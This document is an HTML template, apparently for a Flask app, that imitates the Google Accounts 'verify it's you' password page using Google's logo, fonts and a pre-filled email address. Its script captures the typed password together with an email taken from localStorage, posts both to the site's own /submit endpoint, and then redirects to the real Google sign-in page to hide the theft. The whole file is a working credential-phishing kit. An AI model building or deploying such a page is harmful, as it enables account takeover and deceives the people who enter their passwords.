<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Welcome - Google Accounts</title>
    <link
      href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="{{ url_for('static', filename='style.css') }}"
    />
    <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" />
  </head>
  <body>
    <div class="main-container">
      <div class="box">
        <div class="logo-row">
          <img
            src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
            class="logo"
            style="margin: 0"
          />
        </div>
        <h1 class="title">Welcome</h1>
        <div class="email-display">
          <span class="email-icon">
            <span class="icon-circle">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                height="20"
                width="20"
                viewBox="0 0 20 20"
                fill="none"
              >
                <circle cx="10" cy="10" r="10" fill="#e0e0e0" />
                <path
                  d="M10 10.5a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Zm0 1.25c-1.67 0-5 0.84-5 2.5V16h10v-1.75c0-1.66-3.33-2.5-5-2.5Z"
                  fill="#5f6368"
                />
              </svg>
            </span>
          </span>
          <span id="userEmail">davideje12345@gmail.com</span>
          <span class="email-arrow">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              height="20"
              width="20"
              viewBox="0 0 20 20"
              fill="#202124"
            >
              <polygon points="6,8 14,8 10,13" />
            </svg>
          </span>
        </div>
        <div class="prompt">To continue, first verify it’s you</div>
        <form id="passwordForm">
          <div class="input-container">
            <input
              type="password"
              id="password"
              name="password"
              class="email-input"
              placeholder=" "
              required
            />
            <label for="password" class="input-label"
              >Enter your password</label
            >
          </div>

          <!-- Hidden input to store email from localStorage -->
          <input type="hidden" id="email" name="email" />

          <div class="checkbox">
            <input type="checkbox" id="togglePassword" />
            <label for="togglePassword">Show password</label>
          </div>

          <div class="actions">
            <a href="#" class="text-btn">Forgot password?</a>
            <button type="submit" class="next-btn">Next</button>
          </div>
        </form>
      </div>
    </div>
    <footer>
      <div>English (United States)</div>
      <div>
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
      </div>
    </footer>

    <script>
  const emailInput = document.getElementById("email");
  const savedEmail = localStorage.getItem("userEmail");

  if (emailInput && savedEmail) {
    emailInput.value = savedEmail;
    console.log("Email set from localStorage:", savedEmail);
  } else {
    console.warn("Email not set — either input not found or no saved email.");
  }

  const form = document.getElementById("passwordForm");
  form.addEventListener("submit", function (e) {
    e.preventDefault();

    const password = document.getElementById("password").value;

    fetch("/submit", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        email: savedEmail,
        password: password
      })
    })
      .then((res) => res.json())
      .then((data) => {
        if (data.status === "success") {
          alert("Submitted successfully");
          window.location.href = "https://accounts.google.com"; // ✅ Redirect
        } else {
          alert("Submission failed");
        }
      })
      .catch((err) => {
        console.error("Error:", err);
        alert("Error submitting form.");
      });
  });
</script>

  </body>
</html>
